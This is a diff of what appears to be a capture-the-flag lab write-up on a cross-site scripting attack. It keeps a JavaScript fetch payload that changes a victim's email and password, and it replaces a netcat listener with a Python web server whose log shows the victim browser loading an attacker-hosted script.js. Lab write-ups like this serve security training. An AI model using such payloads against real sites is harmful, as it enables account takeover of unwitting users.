@@ -47,26 +47,31 @@ fetch('/update_email.php', {
   headers: {'Content-Type':'application/x-www-form-urlencoded'},
   body: 'email=pwned@evil.thm&password=hacked123'
 });
-❯ nc -lvnp 9090
-listening on [any] 9090 ...
+❯ python3 -m http.server 9090
+
+Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
 
 ```
 
 
 ``` bash
 
-❯ nc -lvnp 9090
-listening on [any] 9090 ...
-connect to [192.168.149.94] from (UNKNOWN) [192.168.149.94] 59934
-GET /script.js HTTP/1.1
-Host: 192.168.149.94:9090
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0
-Accept: */*
-Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7
-Accept-Encoding: gzip, deflate
-Connection: keep-alive
-Referer: http://10.112.159.136/
+❯ python3 -m http.server 9090
+
+Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
+10.112.159.136 - - [07/Aug/2026 01:59:27] "GET /script.js HTTP/1.1" 200 -
 
 
 ```
+
+<img width="654" height="336" alt="image" src="https://github.com/user-attachments/assets/98f07401-47fc-4b3a-809e-d36e2fe16fc3" />
+
+
+<img width="673" height="235" alt="image" src="https://github.com/user-attachments/assets/2a8f8106-852a-455a-85db-34fb83247cd2" />
+
+
+<img width="724" height="432" alt="image" src="https://github.com/user-attachments/assets/a08ac2ad-e6e2-4e1f-874f-40abf36dc037" />
+
+
+
 
